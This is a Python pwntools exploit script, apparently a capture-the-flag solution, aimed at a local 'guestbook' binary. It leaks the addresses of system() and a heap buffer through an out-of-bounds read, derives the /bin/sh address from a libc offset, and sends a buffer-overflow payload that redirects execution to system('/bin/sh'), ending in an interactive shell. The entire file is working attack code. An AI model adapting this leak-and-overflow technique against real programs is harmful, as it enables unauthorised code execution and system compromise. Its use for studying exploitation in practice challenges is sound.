from __future__ import print_function
# noopnoop helped with this exploit

# Import pwntools
from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']

# Establish the target process, and hand it over to gdb
target = process('./guestbook', env={"LD_PRELOAD":"./libc.so.6"})
gdb.attach(target)

# Establish the function which will create the first four names
def start():
    print(target.recvuntil(">>>"))
    target.sendline("15935")
    print(target.recvuntil(">>>"))
    target.sendline("75395")
    print(target.recvuntil(">>>"))
    target.sendline("01593")
    print(target.recvuntil(">>>"))
    target.sendline("25319")


# Create the function which will calculate the address of /bin/sh from the address of system, since they are both in libc
def calc_binsh(system_adr):
    binsh = system_adr + 0x120c6b
    log.info("The address of binsh is: " + hex(binsh))
    return binsh

# Create the function which will create the payload and send it
def attack(system, binsh, heap):
    target.sendline("2")
    print(target.recvuntil(">>>"))
    target.sendline("0")
    print(target.recvuntil(">>>"))
    payload = "0"*0x4 + "\x00" + "1"*0x5f + p32(0x0) + "2"*0x4 + p32(heap) + "3"*0x2c + p32(system) + "4"*0x4 + p32(binsh)
    target.sendline(payload)

# Run the start function
start()

# Get the infoleak, for the address of system and the address of the heap space for the first name
print(target.recvuntil(">>"))
target.sendline("1")
print(target.recvuntil(">>>"))
target.sendline("6")
leak = target.recv(24)
print(target.recvuntil(">>"))
system_adr = u32(leak[20:24])
heap_adr = u32(leak[0:4])
log.info("The address of system is: " + hex(system_adr))
log.info("The address of heap is: " + hex(heap_adr))

# Calculate the address of /bin/sh
binsh = calc_binsh(system_adr)

# Launch the attack
attack(system_adr, binsh, heap_adr)

# Drop to an interactive shell
target.interactive()